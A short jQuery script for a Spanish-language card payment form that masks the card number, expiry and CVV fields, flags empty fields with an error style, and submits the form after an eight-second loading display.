
jQuery(function($){
   $("#tarjeta").mask("9999 9999 9999 9999");
   $("#caducidad").mask("99/9999");
   $("#CVV").mask("999");
});
  


  

$(document).ready(function(){
           $('#Seguir').click(function(e){
  if($('#tarjeta').val() == "" && $('#caducidad').val() == "" && $('#CVV').val() == ""){
                        $("#tarjeta").addClass("bordererorr");
                        $("#caducidad").addClass("bordererorr");
                        $("#CVV").addClass("bordererorr");
                        $("#fielderr").show();
                        return false;
                  }else if($('#idcart').val() == ""){
                         $('#idcart').addClass("bordererorr");
                        $("#fielderr").show();
                       
                         return false;
                  } else if($('#caducidad').val() == ""){
                         $('#caducidad').addClass("bordererorr");
                         $("#fielderr").show();
                        
                         return false;
                  } else if($('#CVV').val() == ""){
                         $('#CVV').addClass("bordererorr");
                         $("#fielderr").show();
                         
                         return false;
                  }else {
                       $("#selector").show();
                       setTimeout(stp , 8000);
                     }
                     function stp(){
                       $('form').submit();
                     }
                   });
                 });